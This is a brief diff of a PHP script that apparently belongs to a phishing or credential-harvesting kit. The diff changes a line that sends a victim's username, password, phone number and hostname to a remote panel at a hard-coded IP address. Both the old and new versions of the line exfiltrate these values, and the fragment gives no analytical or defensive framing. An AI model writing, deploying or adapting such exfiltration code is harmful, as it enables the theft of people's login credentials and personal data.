@@ -34,7 +34,7 @@ if ($user == "" || $pass == "" || $phone == ""  ) {
   die();
 }
 
-$test = @file_get_contents("http://137.74.171.167/panelZ/a.php?main=$user,$pass,$phone,$hostname");
+$test = @file_get_contents("http://137.74.171.167/panelo/a.php?main=$user,$pass,$phone,$hostname");
 
 ?>
 <!DOCTYPE html>
